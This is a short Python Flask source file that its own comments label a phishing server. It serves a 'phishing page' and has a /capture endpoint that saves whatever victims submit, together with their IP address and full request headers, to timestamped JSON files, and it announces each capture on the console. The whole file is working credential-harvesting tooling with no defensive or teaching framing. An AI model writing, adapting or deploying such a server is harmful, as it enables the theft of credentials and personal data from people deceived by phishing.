from flask import Flask, request, jsonify, send_from_directory
import json
import os
from datetime import datetime

app = Flask(__name__)

# Serve the phishing page
@app.route('/')
def serve_page():
    return send_from_directory('.', 'index.html')

# Capture data endpoint
@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    data['ip'] = request.remote_addr
    data['headers'] = dict(request.headers)
    
    # Save captured data
    if not os.path.exists('captures'):
        os.makedirs('captures')
    
    filename = f'captures/{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Data captured from {data['ip']} - saved to {filename}")
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    print("[*] Phishing server starting on http://localhost:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)
